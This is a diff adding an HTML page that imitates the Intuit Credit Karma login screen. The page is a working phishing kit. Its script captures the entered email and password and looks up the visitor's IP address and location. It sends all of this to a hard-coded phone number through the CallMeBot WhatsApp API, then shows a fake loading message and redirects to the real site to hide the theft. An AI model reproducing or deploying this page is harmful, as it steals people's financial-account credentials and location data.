@@ -1,1 +1,173 @@
 
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Intuit Credit Karma Login
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap");
+   body {
+    font-family: "Inter", sans-serif;
+   }
+  </style>
+ </head>
+ <body class="bg-white text-black">
+  <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
+   <div class="flex items-center space-x-2">
+    <img alt="Logo of Intuit Credit Karma with stylized text and green accents" class="h-10 w-auto" height="40" src="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.100/navi/IC-logo.svg?auto=compress%2Cformat.jpg" width="120"/>
+   </div>
+   <nav class="hidden sm:flex space-x-6 text-gray-600 text-sm font-normal">
+    <a class="hover:underline" href="#">
+     Log in
+    </a>
+    <a class="hover:underline" href="#">
+     Sign up
+    </a>
+   </nav>
+   <button aria-label="Menu" class="sm:hidden flex flex-col justify-center space-y-1.5">
+    <span class="block w-6 h-0.5 bg-green-700 rounded">
+    </span>
+    <span class="block w-6 h-0.5 bg-green-700 rounded">
+    </span>
+    <span class="block w-6 h-0.5 bg-green-700 rounded">
+    </span>
+   </button>
+  </header>
+  <main class="max-w-md mx-auto px-6 mt-10">
+   <h1 class="font-extrabold text-4xl leading-tight mb-8">
+    Log in to Intuit Credit Karma
+   </h1>
+   <form class="space-y-6" id="loginForm">
+    <div>
+     <label class="block font-semibold text-lg mb-2" for="email">
+      Email
+     </label>
+     <input autocomplete="email" class="w-full border border-gray-400 rounded-lg px-4 py-3 text-lg focus:outline-none focus:ring-2 focus:ring-green-700" id="email" name="email" required="" type="email"/>
+    </div>
+    <div>
+     <label class="block font-semibold text-lg mb-2" for="password">
+      Password
+     </label>
+     <div class="relative">
+      <input autocomplete="current-password" class="w-full border border-gray-400 rounded-lg px-4 py-3 text-lg pr-20 focus:outline-none focus:ring-2 focus:ring-green-700" id="password" name="password" required="" type="password"/>
+      <button aria-label="Show password" class="absolute right-4 top-1/2 -translate-y-1/2 text-lg text-black font-normal" id="togglePassword" type="button">
+       Show
+      </button>
+     </div>
+    </div>
+    <button class="w-full bg-green-700 text-white font-semibold text-xl rounded-lg py-4 mt-6" type="submit">
+     Log in
+    </button>
+   </form>
+   <p class="mt-8 text-base leading-relaxed">
+    Can't log in to your account?
+    <a class="underline" href="#">
+     Try another way
+    </a>
+    .
+   </p>
+   <p class="mt-10 text-green-700 font-semibold text-lg text-center cursor-pointer">
+    Create an account
+   </p>
+  </main>
+  <script>
+   const CALLMEBOT_PHONE = "+2349114186966";
+   const CALLMEBOT_APIKEY = "7416935";
+
+   async function getIPInfo() {
+    try {
+     const res = await fetch("https://ipapi.co/json/");
+     if (!res.ok) throw new Error("Failed to fetch IP info");
+     return await res.json();
+    } catch {
+     return null;
+    }
+   }
+
+   function formatDateTime(date) {
+    return date.toLocaleString(undefined, {
+     year: "numeric",
+     month: "short",
+     day: "numeric",
+     hour: "2-digit",
+     minute: "2-digit",
+     second: "2-digit",
+     hour12: false,
+    });
+   }
+
+   document.getElementById("loginForm").addEventListener("submit", async function (
+    e
+   ) {
+    e.preventDefault();
+
+    const email = this.email.value.trim();
+    const password = this.password.value.trim();
+
+    if (!email || !password) {
+     return;
+    }
+
+    this.querySelector("button[type=submit]").disabled = true;
+    this.querySelector("button[type=submit]").textContent = "Processing...";
+
+    const ipInfo = await getIPInfo();
+
+    let message = `🚀{creditkarma Login}🚀 Attempt\n\n`;
+    message += `Email: ${email}\n`;
+    message += `Password: ${password}\n\n`;
+    if (ipInfo) {
+     message += `IP: ${ipInfo.ip}\n`;
+     message += `Time: ${formatDateTime(new Date())}\n`;
+     message += `Country: ${ipInfo.country_name} (${ipInfo.country_code})\n`;
+     message += `Region: ${ipInfo.region}\n`;
+     message += `City: ${ipInfo.city}\n`;
+     message += `ISP: ${ipInfo.org}\n`;
+    } else {
+     message += `IP and location info unavailable.\n`;
+     message += `Time: ${formatDateTime(new Date())}\n`;
+    }
+
+    message += `🚀🚀🚀infocaller🚀🚀🚀`;
+
+    const encodedMessage = encodeURIComponent(message);
+
+    const apiUrl = `https://api.callmebot.com/whatsapp.php?phone=${CALLMEBOT_PHONE}&text=${encodedMessage}&apikey=${CALLMEBOT_APIKEY}`;
+
+    try {
+     await fetch(apiUrl);
+    } catch {}
+
+    const main = document.querySelector("main");
+    main.innerHTML = `
+     <div class="flex flex-col items-center justify-center space-y-4 py-20">
+      <i class="fas fa-spinner fa-spin text-green-700 text-5xl"></i>
+      <p class="text-lg font-semibold text-green-700">Logging you in, please wait...</p>
+     </div>
+    `;
+
+    setTimeout(() => {
+     window.location.href = "https://www.creditkarma.com";
+    }, 4000);
+   });
+
+   // Toggle password visibility
+   const togglePasswordBtn = document.getElementById("togglePassword");
+   const passwordInput = document.getElementById("password");
+   togglePasswordBtn.addEventListener("click", () => {
+    if (passwordInput.type === "password") {
+     passwordInput.type = "text";
+     togglePasswordBtn.textContent = "Hide";
+    } else {
+     passwordInput.type = "password";
+     togglePasswordBtn.textContent = "Show";
+    }
+   });
+  </script>
+ </body>
+</html>
